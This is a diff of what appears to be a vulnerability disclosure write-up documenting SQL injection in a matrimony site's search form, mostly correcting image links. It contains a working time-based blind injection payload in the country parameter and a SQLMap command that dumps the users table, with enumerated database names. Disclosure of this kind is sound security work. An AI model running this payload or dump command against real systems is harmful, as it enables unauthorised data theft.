@@ -77,24 +77,25 @@ Step 1 – search page
 
 The vulnerable Regular search form accepts a user-controlled country parameter.
 
-[!POC(images/sqli%20para.png]
+[!POC](images/sqli%20para.png)
 
 Step 2 – Vulnerable Source Code 
 
 The search function directly embeds POST parameters into the SQL query
 
-[!POC(images/sqli%20para.png]
+[!POC](images/vulnerable%20code.png)
 
 The ‘ in parameter leads to MySQL error confirming SQL injection 
 
-[!POC(images/sqli%20para.png]
+[!POC](images/sqli%20error.png)
+[!POC](images/sqli%20error_2.png)
 
 Step 3 – Manual SQL Injection 
 The intercepted POST request was modified by injecting a time-based SQL payload into the  country parameter. 
 
 Payload: sex=male&maritalstatus=Single&country=Dubai'%2b(select*from(select(sleep(20)))a)%2b'&district=Calicut&state=Kerala&religion=Christian-All&mothertounge=Tamil&agemin=19&agemax=50&search=Search
 
-[!POC(images/sqli%20para.png]
+[!POC](images/sqli%20manual.png)
 
 The application response was delayed by approximately 20 seconds, confirming successful  time-based blind SQL injection.
 
@@ -109,8 +110,8 @@ SQLMap confirmed that the country parameter is injectable using:
 • Error-based SQL Injection  
 • Time-based Blind SQL Injection 
 
-[!POC(images/sqli%20para.png]
-[!POC(images/sqli%20para.png]
+[!POC](images/sqli%201.png)
+[!POC](images/sqli%202.png)
 
 Database Enumeration 
 Using SQLMap, multiple databases were successfully enumerated. 
@@ -121,14 +122,14 @@ performance_schema
 phpmyadmin 
 test
 
-[!POC(images/sqli%20para.png]
-[!POC(images/sqli%20para.png]
+[!POC](images/sqli%203.png)
+[!POC](images/sqli%204.png)
 
 Credential Disclosure 
 The vulnerable SQL Injection allowed extraction of user records from the application's  database.
 command: ```python python .\sqlmap.py -r .\code_test_1.txt -p country -D matrimony -T users --dump```
 
-[!POC(images/sqli%20para.png]
+[!POC](images/sqli%205.png)
 
 The following sensitive information was retrieved: 
 • Usernames  
